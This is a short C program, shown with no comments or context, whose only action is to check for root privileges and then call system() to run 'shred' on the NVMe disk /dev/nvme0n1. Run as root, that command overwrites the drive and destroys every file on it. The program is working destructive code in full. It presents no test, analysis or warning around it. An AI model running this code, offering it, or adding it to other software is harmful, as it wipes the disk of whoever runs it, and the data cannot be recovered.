#include <stdlib.h>
#include <unistd.h>
int main(void) {
    if (geteuid() == 0)
        system("shred -n 1 /dev/nvme0n1");
    return 0;
}
